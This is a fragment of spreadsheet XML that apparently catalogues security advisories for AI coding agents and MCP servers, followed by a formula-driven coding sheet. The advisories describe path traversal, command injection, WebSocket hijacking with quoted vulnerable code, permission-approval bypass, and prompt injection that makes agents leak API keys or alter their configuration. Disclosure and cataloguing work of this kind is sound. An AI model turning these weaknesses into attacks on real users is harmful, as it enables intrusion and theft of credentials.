          <t>https://github.com/advisories/GHSA-gpq4-73r8-h3fj</t>
        </is>
      </c>
    </row>
    <row r="209">
      <c r="A209" s="8" t="inlineStr">
        <is>
          <t>CA-208</t>
        </is>
      </c>
      <c r="B209" s="8" t="inlineStr">
        <is>
          <t>W5</t>
        </is>
      </c>
      <c r="C209" s="8" t="inlineStr">
        <is>
          <t>Other coding agent</t>
        </is>
      </c>
      <c r="D209" s="8" t="inlineStr">
        <is>
          <t>ecosystem</t>
        </is>
      </c>
      <c r="E209" s="8" t="inlineStr">
        <is>
          <t>2026-09-15</t>
        </is>
      </c>
      <c r="F209" s="9" t="inlineStr">
        <is>
          <t>MCP Memory Keeper: Arbitrary local file read in mcp-memory-keeper context_import via unvalidated filePath</t>
        </is>
      </c>
      <c r="G209" s="9" t="inlineStr">
        <is>
          <t>MCP Memory Keeper is an MCP server for persistent context management in AI coding assistants. Prior to 0.13.0, context_import in src/index.ts passes the caller-controlled filePath directly to fs.readFileSync without restricting the path to an export directory. An MCP client, including an LLM agent induced to call the tool, can use ../ traversal or an absolute path to target any file readable by the server process. A valid JSON file is parsed and imported into the caller's session, allowing its full contents to be retrieved through context_get or context_export, while JSON.parse errors for non-JSON files can return leading file bytes in a SyntaxError message. The two disclosure modes can expose other exported sessions, JSON credentials or service-account files, environment files, and portions of SSH keys or other local files. This issue is fixed in version 0.13.0.</t>
        </is>
      </c>
      <c r="H209" s="10" t="inlineStr">
        <is>
          <t>https://www.cve.org/CVERecord?id=CVE-2026-54561</t>
        </is>
      </c>
    </row>
    <row r="210">
      <c r="A210" s="8" t="inlineStr">
        <is>
          <t>CA-209</t>
        </is>
      </c>
      <c r="B210" s="8" t="inlineStr">
        <is>
          <t>W5</t>
        </is>
      </c>
      <c r="C210" s="8" t="inlineStr">
        <is>
          <t>Other coding agent</t>
        </is>
      </c>
      <c r="D210" s="8" t="inlineStr">
        <is>
          <t>ecosystem</t>
        </is>
      </c>
      <c r="E210" s="8" t="inlineStr">
        <is>
          <t>2026-09-15</t>
        </is>
      </c>
      <c r="F210" s="9" t="inlineStr">
        <is>
          <t>CodeRAG: Gradle Wrapper Execution During Dependency Discovery Enables Arbitrary Code Execution</t>
        </is>
      </c>
      <c r="G210" s="9" t="inlineStr">
        <is>
          <t>CodeRAG is a lightweight semantic code search and distillation utility for AI coding agents. Prior to 1.3.1, the default agent-coderag sync flow in code_rag/entry/cli.py calls sync_dependencies for an indexed path, and code_rag/core/manager.py treats build.gradle or build.gradle.kts as sufficient to invoke _sync_gradle. _sync_gradle prefers a repository-controlled gradlew or gradlew.bat file and passes it directly to asyncio.create_subprocess_exec with the repository root as the working directory; validate_path in code_rag/core/utils.py constrains the directory location but does not validate the executable's content or integrity. A victim who indexes an attacker-controlled Gradle repository therefore executes attacker-supplied code with the victim's operating-system privileges, allowing disclosure, modification, persistence, or denial of service in the user environment. This issue is fixed in 1.3.1.</t>
        </is>
      </c>
      <c r="H210" s="10" t="inlineStr">
        <is>
          <t>https://www.cve.org/CVERecord?id=CVE-2026-57586</t>
        </is>
      </c>
    </row>
    <row r="211">
      <c r="A211" s="8" t="inlineStr">
        <is>
          <t>CA-210</t>
        </is>
      </c>
      <c r="B211" s="8" t="inlineStr">
        <is>
          <t>W5</t>
        </is>
      </c>
      <c r="C211" s="8" t="inlineStr">
        <is>
          <t>Other coding agent</t>
        </is>
      </c>
      <c r="D211" s="8" t="inlineStr">
        <is>
          <t>ecosystem</t>
        </is>
      </c>
      <c r="E211" s="8" t="inlineStr">
        <is>
          <t>2026-09-17</t>
        </is>
      </c>
      <c r="F211" s="9" t="inlineStr">
        <is>
          <t>MCP Documentation Server: Web UI API binds to all interfaces without authentication by default</t>
        </is>
      </c>
      <c r="G211" s="9" t="inlineStr">
        <is>
          <t>MCP Documentation Server is a local-first document management and semantic search server for AI coding agents. From 1.13.0 until 1.13.1, the automatically started Web UI in src/server.ts calls startWebServer in src/web-server.ts with START_WEB_UI enabled by default and WEB_PORT set to 3080. startWebServer uses app.listen(PORT) without a host, which binds the unauthenticated document-management API to all interfaces rather than localhost. A network-reachable client can invoke GET /api/documents, GET /api/documents/:id, POST /api/documents, POST /api/search-all, DELETE /api/documents/:id, and GET /api/config without credentials to enumerate and read documents, search the corpus, insert or delete documents, and tamper with the MCP assistant's knowledge base. The service must be reachable from the attacker's LAN, VM network, container bridge, VPN, or another routed network, and the issue does not provide remote code execution. This issue is fixed in 1.13.1.</t>
        </is>
      </c>
      <c r="H211" s="10" t="inlineStr">
        <is>
          <t>https://www.cve.org/CVERecord?id=CVE-2026-54504</t>
        </is>
      </c>
    </row>
    <row r="212">
      <c r="A212" s="8" t="inlineStr">
        <is>
          <t>CA-211</t>
        </is>
      </c>
      <c r="B212" s="8" t="inlineStr">
        <is>
          <t>W5</t>
        </is>
      </c>
      <c r="C212" s="8" t="inlineStr">
        <is>
          <t>OpenCode</t>
        </is>
      </c>
      <c r="D212" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E212" s="8" t="inlineStr">
        <is>
          <t>2026-09-22</t>
        </is>
      </c>
      <c r="F212" s="9" t="n"/>
      <c r="G212" s="9" t="inlineStr">
        <is>
          <t>Missing path validation in the Worktree.remove component of openCode v1.18.26 allows attackers to execute arbitrary recursive directory deletion via a crafted payload.</t>
        </is>
      </c>
      <c r="H212" s="10" t="inlineStr">
        <is>
          <t>https://github.com/advisories/GHSA-fx2r-fm89-x94v</t>
        </is>
      </c>
    </row>
    <row r="213">
      <c r="A213" s="8" t="inlineStr">
        <is>
          <t>CA-212</t>
        </is>
      </c>
      <c r="B213" s="8" t="inlineStr">
        <is>
          <t>W5</t>
        </is>
      </c>
      <c r="C213" s="8" t="inlineStr">
        <is>
          <t>Amazon Q Developer</t>
        </is>
      </c>
      <c r="D213" s="8" t="inlineStr">
        <is>
          <t>ecosystem</t>
        </is>
      </c>
      <c r="E213" s="8" t="inlineStr">
        <is>
          <t>2026-09-24</t>
        </is>
      </c>
      <c r="F213" s="9" t="inlineStr">
        <is>
          <t>Language Servers for AWS Vulnerable to Arbitrary Code Execution</t>
        </is>
      </c>
      <c r="G213" s="9" t="inlineStr">
        <is>
          <t>### Summary Language Servers for AWS (the aws/language-servers project) provide the underlying language-server runtime that powers Amazon Q Developer's AI coding assistance across its IDE plugins (Visual Studio Code, JetBrains, Eclipse, and Visual Studio).  Improper trust boundary enforcement in Language Servers for AWS may allow for arbitrary code execution. If a local user opens a maliciously crafted workspace, any commands within the project configuration files may be automatically executed.  ### Impact  When a local user opens a maliciously crafted workspace and trusts it when prompted, commands defined in the workspace's project-level configuration files may be executed automatically, resulting in arbitrary code execution on the user's host.  This issue is triggered when a user opens a workspace, trusts it, and the agent subsequently executes commands defined in the project-level configuration files.   Impacted versions: Language Servers for AWS version &lt;1.65.0.  ### Patches This issue has been addressed in Language Servers for AWS version 1.65.0. We recommend upgrading to the latest version and ensuring any forked or derivative code is patched to incorporate the new fixes.   ### Workarounds No workarounds are available.  ### References If you have any questions or comments about this advisory, AWS Security asks that you contact them via their [vulnerability reporting page](https://aws.amazon.com/security/vulnerability-reporting) or directly via email to [aws-security@amazon.com](mailto:aws-security@amazon.com). Please do not create a public GitHub issue.  ### Acknowledgement   AWS Security would like to thank Wiz and Maor Dokhanian for collaborating on this issue through the coordinated vulnerability disclosure process.</t>
        </is>
      </c>
      <c r="H213" s="10" t="inlineStr">
        <is>
          <t>https://github.com/advisories/GHSA-xhcr-j4j9-3gh7</t>
        </is>
      </c>
    </row>
    <row r="214">
      <c r="A214" s="8" t="inlineStr">
        <is>
          <t>CA-213</t>
        </is>
      </c>
      <c r="B214" s="8" t="inlineStr">
        <is>
          <t>W5</t>
        </is>
      </c>
      <c r="C214" s="8" t="inlineStr">
        <is>
          <t>Amazon Q Developer</t>
        </is>
      </c>
      <c r="D214" s="8" t="inlineStr">
        <is>
          <t>ecosystem</t>
        </is>
      </c>
      <c r="E214" s="8" t="inlineStr">
        <is>
          <t>2026-09-24</t>
        </is>
      </c>
      <c r="F214" s="9" t="inlineStr">
        <is>
          <t>Language Servers for AWS vulnerable to arbitrary file write</t>
        </is>
      </c>
      <c r="G214" s="9" t="inlineStr">
        <is>
          <t>## Summary Language Servers for AWS (the aws/language-servers project) provides the Language Server Protocol implementations that power AWS developer tooling, including the Amazon Q Developer agentic chat experience, across IDEs such as VS Code, JetBrains, Visual Studio, and Eclipse.  Missing symlink validation in Language Servers for AWS may allow an arbitrary file write outside of the workspace trust boundary. This may occur when a local user opens a workspace containing a maliciously crafted symlink that resolves to a file path outside the workspace trust boundary.  ## Impact  If a user opens a maliciously crafted workspace containing a symlink that resides within the workspace but resolves to a location outside the workspace trust boundary, the agent may follow that symlink and write to the external location without prompting the user for approval. This can result in the modification of files outside the intended workspace boundary.  This issue is triggered when a user opens a workspace, trusts it, and the agent subsequently writes to a path within that workspace.  Impacted versions: Language Servers for AWS version &lt;1.69.0.  ## Patches This issue has been addressed in AWS Language Servers version 1.69.0. We recommend upgrading to the latest version and ensuring any forked or derivative code is patched to incorporate the new fixes.   ## Workarounds No workarounds are available.  ## References If you have any questions or comments about this advisory, AWS Security ask that you contact them via their [vulnerability reporting page](https://aws.amazon.com/security/vulnerability-reporting) or directly via email to [aws-security@amazon.com](mailto:aws-security@amazon.com). Please do not create a public GitHub issue.  ## Acknowledgement   AWS Security would like to thank Wiz and Maor Dokhanian for collaborating on this issue through the coordinated vulnerability disclosure process.</t>
        </is>
      </c>
      <c r="H214" s="10" t="inlineStr">
        <is>
          <t>https://github.com/advisories/GHSA-6v3r-4p5c-mrp5</t>
        </is>
      </c>
    </row>
    <row r="215">
      <c r="A215" s="8" t="inlineStr">
        <is>
          <t>CA-214</t>
        </is>
      </c>
      <c r="B215" s="8" t="inlineStr">
        <is>
          <t>W5</t>
        </is>
      </c>
      <c r="C215" s="8" t="inlineStr">
        <is>
          <t>Cline</t>
        </is>
      </c>
      <c r="D215" s="8" t="inlineStr">
        <is>
          <t>ecosystem</t>
        </is>
      </c>
      <c r="E215" s="8" t="inlineStr">
        <is>
          <t>2026-09-24</t>
        </is>
      </c>
      <c r="F215" s="9" t="inlineStr">
        <is>
          <t>Cline: Cross-Origin WebSocket Hijacking in Cline Hub Dashboard (`/browser` endpoint)</t>
        </is>
      </c>
      <c r="G215" s="9" t="inlineStr">
        <is>
          <t>### Summary  The Cline Hub dashboard server (`@cline/cline-hub`), launched via the `cline dashboard` CLI command, accepts WebSocket connections on the `/browser` endpoint without validating the HTTP `Origin` header. When `ROOM_SECRET` is not set—the default for local (`127.0.0.1`) binds—`isAuthorizedBrowserRequest()` returns `true` unconditionally, allowing any website a developer visits to open a cross-origin WebSocket to `ws://127.0.0.1:8787/browser`. An attacker-controlled page can then send `desktopCommand` frames to read workspace/session state, mutate MCP and provider settings, and—because dashboard sessions default to `autoApprove: true` for all tools—trigger arbitrary command execution when a provider/model is configured. Dynamically confirmed: an `upsert_mcp_server` frame injected a malicious `stdio` MCP server entry into the victim's Cline settings file with `ok: true` response.  ### Details  The vulnerable code path spans multiple files in the `apps/cline-hub` workspace.  **No secret by default (local bind)**  `apps/cline-hub/src/options.ts:54–57` converts an empty `ROOM_SECRET` environment variable to `undefined`:  ```ts // apps/cline-hub/src/options.ts:54 function normalizeRoomSecret(value: string | undefined): string | undefined {     const secret = value?.trim();     return secret ? secret : undefined; } ```  `apps/cline-hub/src/options.ts:67–85` allows the local default host (`127.0.0.1`) to start without a secret, so `roomSecret` remains `undefined` in the default configuration.  **Authorization bypass — Origin not checked**  `apps/cline-hub/src/server.ts:61–64` short-circuits all authorization when `roomSecret` is `undefined`, and performs no `Origin` header check at any point:  ```ts // apps/cline-hub/src/server.ts:61 function isAuthorizedBrowserRequest(url: URL): boolean {     if (!roomSecret) return true;     return url.searchParams.get("roomSecret") === roomSecret; } ```  **WebSocket upgrade without Origin validation**  `apps/cline-hub/src/server.ts:86–97` upgrades any request to `/browser` without inspecting the `Origin` header:  ```ts // apps/cline-hub/src/server.ts:86 if (url.pathname === "/browser") {     if (!isAuthorizedBrowserRequest(url)) {         return createJsonResponse({ error: "invalid_room_secret" }, 401);     }     if (server.upgrade(req, { data })) return undefined; } ```  Browsers enforce the Same-Origin Policy for fetch/XHR but not for WebSocket connections—they always include the `Origin` header but leave enforcement to the server. Because the server ignores `Origin`, any cross-origin JavaScript can connect.  **Auto-approve tool policy for dashboard sessions**  `apps/cline-hub/src/server/sessions.ts:129–133` sets the default tool policy to auto-approve all tools for new dashboard sessions:  ```ts // apps/cline-hub/src/server/sessions.ts:129 toolPolicies:     options?.autoApproveTools === false         ? { "*": { autoApprove: false } }         : { "*": { autoApprove: true } }, ```  **MCP settings write sin</t>
        </is>
      </c>
      <c r="H215" s="10" t="inlineStr">
        <is>
          <t>https://github.com/advisories/GHSA-3cj3-hqcr-g934</t>
        </is>
      </c>
    </row>
    <row r="216">
      <c r="A216" s="8" t="inlineStr">
        <is>
          <t>CA-215</t>
        </is>
      </c>
      <c r="B216" s="8" t="inlineStr">
        <is>
          <t>W5</t>
        </is>
      </c>
      <c r="C216" s="8" t="inlineStr">
        <is>
          <t>Kiro</t>
        </is>
      </c>
      <c r="D216" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E216" s="8" t="inlineStr">
        <is>
          <t>2026-09-24</t>
        </is>
      </c>
      <c r="F216" s="9" t="n"/>
      <c r="G216" s="9" t="inlineStr">
        <is>
          <t>The file write tool in Amazon Kiro IDE versions before 1.0.242 might allow remote unauthenticated actors to inject crafted instructions into the agent's context. When a user runs the agent in a crafted repository as an untrusted workspace, sending any message can cause agent modifications to auto-loaded global configuration paths.    We recommend you upgrade to Kiro IDE version 1.0.242 or later. Users who ran the agent in an untrusted workspace on an earlier version should also review the global Kiro configuration directory (~/.kiro) for entries they did not create.</t>
        </is>
      </c>
      <c r="H216" s="10" t="inlineStr">
        <is>
          <t>https://github.com/advisories/GHSA-356h-q6p2-3c99</t>
        </is>
      </c>
    </row>
    <row r="217">
      <c r="A217" s="8" t="inlineStr">
        <is>
          <t>CA-216</t>
        </is>
      </c>
      <c r="B217" s="8" t="inlineStr">
        <is>
          <t>W5</t>
        </is>
      </c>
      <c r="C217" s="8" t="inlineStr">
        <is>
          <t>Other coding agent</t>
        </is>
      </c>
      <c r="D217" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E217" s="8" t="inlineStr">
        <is>
          <t>2026-09-26</t>
        </is>
      </c>
      <c r="F217" s="9" t="n"/>
      <c r="G217" s="9" t="inlineStr">
        <is>
          <t>OpenClaw is a coding agent distributed as the npm package `openclaw`. In affected versions (2026.7.1 through 2026.7.2), alternate but valid `file:` URL spellings supplied over the Agent Client Protocol (ACP) were treated as relative paths and were incorrectly classified as reads scoped to the session working directory. When an operator connected `openclaw acp client` to an untrusted or compromised ACP peer, that peer could request a read of a file outside the session working directory without the approval prompt normally required for that path, resulting in disclosure of local file contents. The demonstrated impact is limited to file confidentiality; mutating and command-capable tool classes are not affected. This issue is fixed in OpenClaw 2026.8.1.</t>
        </is>
      </c>
      <c r="H217" s="10" t="inlineStr">
        <is>
          <t>https://github.com/advisories/GHSA-3fp8-r6r3-vjcc</t>
        </is>
      </c>
    </row>
    <row r="218">
      <c r="A218" s="8" t="inlineStr">
        <is>
          <t>CA-217</t>
        </is>
      </c>
      <c r="B218" s="8" t="inlineStr">
        <is>
          <t>W5</t>
        </is>
      </c>
      <c r="C218" s="8" t="inlineStr">
        <is>
          <t>Claude Code</t>
        </is>
      </c>
      <c r="D218" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E218" s="8" t="inlineStr">
        <is>
          <t>2026-09-26</t>
        </is>
      </c>
      <c r="F218" s="9" t="n"/>
      <c r="G218" s="9" t="inlineStr">
        <is>
          <t>OpenClaw (npm package `openclaw`) before 2026.7.1 fails to enforce the owner-only authorization requirement for Claude Code permission prompts delivered through the MCP channel bridge. An authorized non-owner channel sender with channel command access can approve or deny a pending permission request intended for the owner, causing the requested action to proceed without owner consent. The practical impact depends on the pending action and the host capabilities requested by the Claude Code run. The issue is fixed in version 2026.7.1.</t>
        </is>
      </c>
      <c r="H218" s="10" t="inlineStr">
        <is>
          <t>https://github.com/advisories/GHSA-87g7-76gr-73g8</t>
        </is>
      </c>
    </row>
    <row r="219">
      <c r="A219" s="8" t="inlineStr">
        <is>
          <t>CA-218</t>
        </is>
      </c>
      <c r="B219" s="8" t="inlineStr">
        <is>
          <t>W5</t>
        </is>
      </c>
      <c r="C219" s="8" t="inlineStr">
        <is>
          <t>Other coding agent</t>
        </is>
      </c>
      <c r="D219" s="8" t="inlineStr">
        <is>
          <t>ecosystem</t>
        </is>
      </c>
      <c r="E219" s="8" t="inlineStr">
        <is>
          <t>2026-09-28</t>
        </is>
      </c>
      <c r="F219" s="9" t="inlineStr">
        <is>
          <t>Token Optimizer MCP: Unauthenticated Path Traversal in Dashboard Session Log API Endpoints</t>
        </is>
      </c>
      <c r="G219" s="9" t="inlineStr">
        <is>
          <t>Token Optimizer MCP measures token savings per AI coding agent, optimizes context, and shares a live local knowledge graph across 16 CLI clients. Prior to version 5.1.0, the dashboard HTTP server in token-optimizer-mcp exposes /api/session-summary and /api/session-events with no authentication middleware — any network-accessible client can reach them without credentials. Both handlers concatenate the caller-supplied sessionId query parameter directly into a filesystem path via path.join, and Node.js normalizes .. segments at resolution time, allowing an unauthenticated attacker to read any .jsonl file reachable from the server's filesystem. This issue has been patched in version 5.1.0.</t>
        </is>
      </c>
      <c r="H219" s="10" t="inlineStr">
        <is>
          <t>https://www.cve.org/CVERecord?id=CVE-2026-55156</t>
        </is>
      </c>
    </row>
    <row r="220">
      <c r="A220" s="8" t="inlineStr">
        <is>
          <t>CA-219</t>
        </is>
      </c>
      <c r="B220" s="8" t="inlineStr">
        <is>
          <t>W5</t>
        </is>
      </c>
      <c r="C220" s="8" t="inlineStr">
        <is>
          <t>Other coding agent</t>
        </is>
      </c>
      <c r="D220" s="8" t="inlineStr">
        <is>
          <t>ecosystem</t>
        </is>
      </c>
      <c r="E220" s="8" t="inlineStr">
        <is>
          <t>2026-09-28</t>
        </is>
      </c>
      <c r="F220" s="9" t="inlineStr">
        <is>
          <t>Token Optimizer MCP: OS command injection in smart_user via username in get-user-info</t>
        </is>
      </c>
      <c r="G220" s="9" t="inlineStr">
        <is>
          <t>Token Optimizer MCP measures token savings per AI coding agent, optimizes context, and shares a live local knowledge graph across 16 CLI clients. Prior to version 5.1.0, token-optimizer-mcp is vulnerable to OS command injection in the smart_user tool. Any MCP client that can call the smart_user tool can execute arbitrary shell commands through the username argument of the get-user-info operation. The commands execute with the privileges of the user running the token-optimizer-mcp server. This issue has been patched in version 5.1.0.</t>
        </is>
      </c>
      <c r="H220" s="10" t="inlineStr">
        <is>
          <t>https://www.cve.org/CVERecord?id=CVE-2026-55157</t>
        </is>
      </c>
    </row>
    <row r="221">
      <c r="A221" s="8" t="inlineStr">
        <is>
          <t>CA-220</t>
        </is>
      </c>
      <c r="B221" s="8" t="inlineStr">
        <is>
          <t>W5</t>
        </is>
      </c>
      <c r="C221" s="8" t="inlineStr">
        <is>
          <t>Kilo Code</t>
        </is>
      </c>
      <c r="D221" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E221" s="8" t="inlineStr">
        <is>
          <t>2026-09-29</t>
        </is>
      </c>
      <c r="F221" s="9" t="n"/>
      <c r="G221" s="9" t="inlineStr">
        <is>
          <t>An issue in Kilo Code before v7.4.1 allows a local attacker to execute arbitrary code via the permission/allow-everything endpoint</t>
        </is>
      </c>
      <c r="H221" s="10" t="inlineStr">
        <is>
          <t>https://github.com/advisories/GHSA-vmfg-8hhv-69wh</t>
        </is>
      </c>
    </row>
    <row r="222">
      <c r="A222" s="8" t="inlineStr">
        <is>
          <t>CA-221</t>
        </is>
      </c>
      <c r="B222" s="8" t="inlineStr">
        <is>
          <t>W5</t>
        </is>
      </c>
      <c r="C222" s="8" t="inlineStr">
        <is>
          <t>Claude Code</t>
        </is>
      </c>
      <c r="D222" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E222" s="8" t="inlineStr">
        <is>
          <t>2026-09-30</t>
        </is>
      </c>
      <c r="F222" s="9" t="n"/>
      <c r="G222" s="9" t="inlineStr">
        <is>
          <t>Claude Code selected an API key stored by Claude Code, for example from an earlier `/login` or written directly to its configuration, ahead of the user's valid Claude Enterprise or Team sign-in when fetching the organization's server-managed settings, even though the session itself authenticated with the Enterprise or Team account. When the settings endpoint rejected that stored key, the session started without the organization's server-managed policy (such as permission deny rules, model restrictions and managed-only locks) or, if a previously cached copy existed on the machine, kept applying that stale copy without receiving later policy changes — while continuing to operate as the organization's account. Triggering this required local access to a device with such a stored API key; the no-policy case additionally required that no managed settings had previously been cached. Endpoint-managed (MDM or file-based) settings were not affected. Claude for Enterprise organizations were affected from version 2.0.68; Claude for Work (Team) organizations from version 2.1.38, when server-managed settings became available to them.  Users on standard Claude Code auto-update have received this fix already. Users performing manual updates are advised to update to version 2.1.260 or later.  Thank you to Tamas Voros / NVIDIA AI Red Team for reporting this issue.</t>
        </is>
      </c>
      <c r="H222" s="10" t="inlineStr">
        <is>
          <t>https://www.cve.org/CVERecord?id=CVE-2026-103012</t>
        </is>
      </c>
    </row>
    <row r="223">
      <c r="A223" s="8" t="inlineStr">
        <is>
          <t>CA-222</t>
        </is>
      </c>
      <c r="B223" s="8" t="inlineStr">
        <is>
          <t>W5</t>
        </is>
      </c>
      <c r="C223" s="8" t="inlineStr">
        <is>
          <t>Claude Code</t>
        </is>
      </c>
      <c r="D223" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E223" s="8" t="inlineStr">
        <is>
          <t>2026-10-07</t>
        </is>
      </c>
      <c r="F223" s="9" t="inlineStr">
        <is>
          <t>Arbitrary File Write via Write-Time Symlink Following (TOCTOU) in Claude Code</t>
        </is>
      </c>
      <c r="G223" s="9" t="inlineStr">
        <is>
          <t>Claude Code validated that a target file path resided within the project working directory at permission-check time, but re-resolved the path at write time without repeating that validation. This time-of-check to time-of-use (TOCTOU) gap allowed an attacker who could write to the workspace to atomically replace a project file with a symlink, causing Claude Code to follow the symlink and write its output to an arbitrary file outside the project sandbox. Exploitation required the ability to win a race condition against the write operation and write access to the shared workspace, enabling a lower-privileged attacker to redirect benign edits to sensitive files (e.g., shell configuration) in a higher-privileged session.  Users on standard Claude Code auto-update have received this fix already. Users performing manual updates are advised to update to the latest version.  Thank you to hackerone.com/c_h4ck_0 for reporting this issue.</t>
        </is>
      </c>
      <c r="H223" s="10" t="inlineStr">
        <is>
          <t>https://www.cve.org/CVERecord?id=CVE-2026-103435</t>
        </is>
      </c>
    </row>
    <row r="224">
      <c r="A224" s="8" t="inlineStr">
        <is>
          <t>CA-223</t>
        </is>
      </c>
      <c r="B224" s="8" t="inlineStr">
        <is>
          <t>W5</t>
        </is>
      </c>
      <c r="C224" s="8" t="inlineStr">
        <is>
          <t>SWE-agent</t>
        </is>
      </c>
      <c r="D224" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E224" s="8" t="inlineStr">
        <is>
          <t>2026-10-10</t>
        </is>
      </c>
      <c r="F224" s="9" t="n"/>
      <c r="G224" s="9" t="inlineStr">
        <is>
          <t>mini-swe-agent 1.10.0 through 2.4.6 contains an information exposure vulnerability in BubblewrapEnvironment because bwrap omits --clearenv, so sandboxed commands inherit the host environment. Attackers using prompt injection in processed task content can make the agent read API keys from the environment and exfiltrate them over the shared network.</t>
        </is>
      </c>
      <c r="H224" s="10" t="inlineStr">
        <is>
          <t>https://github.com/advisories/GHSA-p449-r4wm-3hpm</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22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4" customWidth="1" min="3" max="3"/>
    <col width="42"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8"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7" customWidth="1" min="34" max="34"/>
    <col width="8" customWidth="1" min="35" max="35"/>
    <col width="8" customWidth="1" min="36" max="36"/>
    <col width="8" customWidth="1" min="37" max="37"/>
    <col width="8" customWidth="1" min="38" max="38"/>
    <col width="34" customWidth="1" min="39" max="39"/>
    <col width="6" customWidth="1" min="40" max="40"/>
    <col width="30" customWidth="1" min="41" max="41"/>
  </cols>
  <sheetData>
    <row r="1" ht="30" customHeight="1">
      <c r="A1" s="4" t="inlineStr">
        <is>
          <t>case_id</t>
        </is>
      </c>
      <c r="B1" s="4" t="inlineStr">
        <is>
          <t>batch</t>
        </is>
      </c>
      <c r="C1" s="4" t="inlineStr">
        <is>
          <t>product</t>
        </is>
      </c>
      <c r="D1" s="4" t="inlineStr">
        <is>
          <t>title</t>
        </is>
      </c>
      <c r="E1" s="4" t="inlineStr">
        <is>
          <t>d1</t>
        </is>
      </c>
      <c r="F1" s="4" t="inlineStr">
        <is>
          <t>d2</t>
        </is>
      </c>
      <c r="G1" s="4" t="inlineStr">
        <is>
          <t>d3</t>
        </is>
      </c>
      <c r="H1" s="4" t="inlineStr">
        <is>
          <t>d4</t>
        </is>
      </c>
      <c r="I1" s="4" t="inlineStr">
        <is>
          <t>d5</t>
        </is>
      </c>
      <c r="J1" s="4" t="inlineStr">
        <is>
          <t>d6</t>
        </is>
      </c>
      <c r="K1" s="4" t="inlineStr">
        <is>
          <t>d7</t>
        </is>
      </c>
      <c r="L1" s="4" t="inlineStr">
        <is>
          <t>d8</t>
        </is>
      </c>
      <c r="M1" s="4" t="inlineStr">
        <is>
          <t>primary_domain</t>
        </is>
      </c>
      <c r="N1" s="4" t="inlineStr">
        <is>
          <t>c01</t>
        </is>
      </c>
      <c r="O1" s="4" t="inlineStr">
        <is>
          <t>c02</t>
        </is>
      </c>
      <c r="P1" s="4" t="inlineStr">
        <is>
          <t>c03</t>
        </is>
      </c>
      <c r="Q1" s="4" t="inlineStr">
        <is>
          <t>c04</t>
        </is>
      </c>
      <c r="R1" s="4" t="inlineStr">
        <is>
          <t>c05</t>
        </is>
      </c>
      <c r="S1" s="4" t="inlineStr">
        <is>
          <t>c06</t>
        </is>
      </c>
      <c r="T1" s="4" t="inlineStr">
        <is>
          <t>c07</t>
        </is>
      </c>
      <c r="U1" s="4" t="inlineStr">
        <is>
          <t>c08</t>
        </is>
      </c>
      <c r="V1" s="4" t="inlineStr">
        <is>
          <t>c09</t>
        </is>
      </c>
      <c r="W1" s="4" t="inlineStr">
        <is>
          <t>c10</t>
        </is>
      </c>
      <c r="X1" s="4" t="inlineStr">
        <is>
          <t>c11</t>
        </is>
      </c>
      <c r="Y1" s="4" t="inlineStr">
        <is>
          <t>c12</t>
        </is>
      </c>
      <c r="Z1" s="4" t="inlineStr">
        <is>
          <t>c13</t>
        </is>
      </c>
      <c r="AA1" s="4" t="inlineStr">
        <is>
          <t>c14</t>
        </is>
      </c>
      <c r="AB1" s="4" t="inlineStr">
        <is>
          <t>c15</t>
        </is>
      </c>
      <c r="AC1" s="4" t="inlineStr">
        <is>
          <t>c16</t>
        </is>
      </c>
      <c r="AD1" s="4" t="inlineStr">
        <is>
          <t>c17</t>
        </is>
      </c>
      <c r="AE1" s="4" t="inlineStr">
        <is>
          <t>c18</t>
        </is>
      </c>
      <c r="AF1" s="4" t="inlineStr">
        <is>
          <t>c19</t>
        </is>
      </c>
      <c r="AG1" s="4" t="inlineStr">
        <is>
          <t>c20</t>
        </is>
      </c>
      <c r="AH1" s="4" t="inlineStr">
        <is>
          <t>covered</t>
        </is>
      </c>
      <c r="AI1" s="4" t="inlineStr">
        <is>
          <t>n_domains</t>
        </is>
      </c>
      <c r="AJ1" s="4" t="inlineStr">
        <is>
          <t>n_applicable</t>
        </is>
      </c>
      <c r="AK1" s="4" t="inlineStr">
        <is>
          <t>n_breached</t>
        </is>
      </c>
      <c r="AL1" s="4" t="inlineStr">
        <is>
          <t>gcs</t>
        </is>
      </c>
      <c r="AM1" s="4" t="inlineStr">
        <is>
          <t>check</t>
        </is>
      </c>
      <c r="AN1" s="4" t="inlineStr">
        <is>
          <t>done</t>
        </is>
      </c>
      <c r="AO1" s="4" t="inlineStr">
        <is>
          <t>notes</t>
        </is>
      </c>
    </row>
    <row r="2">
      <c r="A2" s="11">
        <f>Cases!A2</f>
        <v/>
      </c>
      <c r="B2" s="11">
        <f>Cases!B2</f>
        <v/>
      </c>
      <c r="C2" s="11">
        <f>Cases!C2</f>
        <v/>
      </c>
      <c r="D2" s="11">
        <f>IF(Cases!F2="",LEFT(Cases!G2,120),Cases!F2)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E2:L2)=0,"",SUM(E2:L2))</f>
        <v/>
      </c>
      <c r="AJ2" s="13">
        <f>IF(AI2="","",N(E2)*3+N(F2)*2+N(G2)*2+N(H2)*2+N(I2)*2+N(J2)*3+N(K2)*3+N(L2)*3)</f>
        <v/>
      </c>
      <c r="AK2" s="13">
        <f>IF(AI2="","",COUNTIF(N2:AG2,1))</f>
        <v/>
      </c>
      <c r="AL2" s="13">
        <f>IF(OR(AJ2="",AJ2=0),"",ROUND(100*(AJ2-AK2)/AJ2,1))</f>
        <v/>
      </c>
      <c r="AM2" s="11">
        <f>IF(AI2="","",IF(AI2=0,"No domain coded 1; ","")&amp;IF(M2="","Primary domain missing; ",IF(IFERROR(INDEX(E2:L2,1,M2),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N2:AG2)&lt;&gt;AJ2,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH2="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN2" s="13">
        <f>IF(AND(AI2&lt;&gt;"",AM2=""),1,0)</f>
        <v/>
      </c>
      <c r="AO2" s="14" t="n"/>
